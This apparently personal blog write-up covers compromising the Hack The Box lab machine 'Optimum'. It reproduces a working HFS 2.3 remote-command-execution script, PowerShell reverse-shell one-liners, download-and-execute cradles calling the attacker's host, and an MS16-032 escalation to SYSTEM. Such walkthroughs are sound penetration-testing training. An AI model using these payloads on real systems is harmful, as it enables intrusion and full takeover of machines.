---
layout: post
title: HTB Optimum Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/optimum/optimum.png
tags: [HTB, OSCP, EASY]
---

# Optimum
![Optimum](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/optimum/optimum.png)


| Name | Optimum |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 14 Mar 2017 |
| DIFFICULTY | Easy |

IP:10.10.10.8

# Port Scan

Like every hack the box machine I started with a nmap utilizing the nmap scripting engine to run default scripts and enumerate service versions. There is only one open port on this machine, port 80 serving a HttpFileServer. HttpFileServer (HFS) is a free file server that runs over HTTP.

`nmap -p- -sVC -oN scriptScan.nmap 10.10.10.8`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP 80

Going to `http://10.10.10.8` shows the HFS home page. The first thing that I noticed was a version leak of `HttpFileServer 2.3`

![Optimum](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/optimum/image1.png)

I ran a `searchsploit` against that version and there are a handful of RCE vulnerability available.

```
┌──(root㉿kali)-[~/htb/optimum]
└─# searchsploit HFS 2.3
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                   | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```


### HFS RCE

I copied the first exploit to my current working directory. (I chose the first one for no particular reason other than it was the first one.)
```
┌──(root㉿kali)-[~/htb/optimum]
└─# searchsploit -m windows/remote/49584.py 
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
File Type: ASCII text, with very long lines (546)

Copied to: /root/htb/optimum/49584.py
```

I opened the exploit with `vim 49584.py` to review the code to see what it is doing. The first couple of lines are just importing libraries. Then it defines some variables for the `lhost` and `rhost`, I went ahead and changed the `lhost` and `lport` to my IP and port I will be listening on. Next it will create a new variable that contains the reverse shell command. It is then encoded and the final payload is created and sent. The only thing that I changed was the `lhost`, and `lport`.

```python
#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.x.x"
lport = 9001
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}') 
```

Running the script gives me a reverse shell
```
┌──(root㉿kali)-[~/htb/optimum]
└─# python3 49584.py                                    

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.6
lport:  9001
rhost:  10.10.10.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwAOQAwADAAMQApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

Listening for connection...
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.8] 49158

PS C:\Users\kostas\Desktop> 
```

# NT Authority\\System

Running `systeminfo` I saw that this is running `Microsoft Windows Server 2012 R2 Standard`. This is an older version of the windows server, it was released in Oct of 2013 and will hit it's end of life Oct 2023. There is a good chance that this machine is not updated and an exploit is available for it.
```
PS C:\Users\kostas\Desktop> systeminfo                                                                                                                       
                                                                                                                                                             
Host Name:                 OPTIMUM                                            
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                         
OS Version:                6.3.9600 N/A Build 9600                            
OS Manufacturer:           Microsoft Corporation                                                                                                             
OS Configuration:          Standalone Server                                  
OS Build Type:             Multiprocessor Free                                
Registered Owner:          Windows User 
```

A lot of the windows exploit suggested scripts/programs are old and not very well maintained. However it would be worth running some of them on this machine as it is older. Rasta Mouse created a PowerShell script called [Sherlock.ps1](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1) that I ran against the machine. I downloaded the script onto my Kali machine using `wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1`. I appended `Find-AllVulns` to the last line of the file so it will execute with a download cradle. I then hosted the file using `python3 -m http.server 80`

Below is a snip from the windows machine where I used a download cradle to download and execute `Sherlock.ps1`. There are three potential options to escalate my privs to NT Authority\\System 
```
IEX (New-Object Net.Webclient).downloadstring("http://YOURIP/Sherlock.ps1")

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

```

## Architecture

From where I am at in the exploitation of this machine none of those exploits will work . Why you might ask, `Architecture`, all of these exploits are written for 64-bit. Right now our powershell process is most likely in a 32-bit process, because thats what HFS was running in when we got the shell. Its also generally better to be in a 64-bit process, exploits work better. I can confirm that we are in a 32-bit process with this command `[Environment]::Is64BitProcess`

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```

This table from https://ss64.com/nt/syntax-64bit.html shows the different paths for each architecture. Because HFS is running in a 32-bit session powershell ran from `C:\Windows\system32\`. I can "upgrade" to a 64-bit session by calling powershell from `C:\Windows\sysNative\`

![Optimum](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/optimum/image2.png)


"Upgrading" to a 64-bit shell is pretty easy as we already have access to the machine. I downloaded a [PowershellTcpOneLiner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) script and modified it to have my IP and Port
```
┌──(root㉿kali)-[/opt/winPriv]
└─# cat Invoke-PowerShellTcpOneLine.ps1 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

I then hosted the file with `python3 -m http.server 80`

On the windows machine I changed my working directory to the 64 bit folder that contained the 64-bit powershell and used it to execute the reverse shell.
```
cd C:\Windows\sysNative\WindowsPowerShell\v1.0

.\powershell.exe (New-Object Net.Webclient).downloadstring("http://10.10.14.6/Invoke-PowerShellTcpOneLine.ps1")
```

Back on my `netcat` listener I now how as 64-bit shell!
```
┌──(root㉿kali)-[~/htb/optimum]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.8] 49221

PS C:\Windows\system32\WindowsPowerShell\v1.0> [Environment]::Is64BitProcess
True
```

I tried a lot of different exploits but I found [this](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) one from empire to work the best. Most of the exploits will pop open a new window as NT Authority\\System. [This](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) version of the script will run a command as system.

```
    .EXAMPLE

        C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"

        Description
        -----------
        Will run the iex download cradle as SYSTEM
```

I downloaded the script onto my Kali machine and added `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcpOneLine.ps1')"` to the end of the exploit. That will download and run my reverse shell as NT Authority\\System

```
                
            $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
            $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
            $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
        }
        
        $StartTokenRace.Stop()
        $SafeGuard.Stop()
    }
}
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcpOneLine.ps1')"
```

It's going to be a download cradle within a download cradle. From the 64-bit shell I ran a download cradle that will download and execute `Invoke-MS16032`, that script will then download and execute a reverse shell.
```
PS C:\Users\kostas\Desktop> IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.6/Invoke-MS16032.ps1")
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

On `netcat` I catch a shell
```
┌──(root㉿kali)-[/opt/winPriv]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.8] 49246

PS C:\Users\kostas\Desktop> whoami
nt authority\system
```
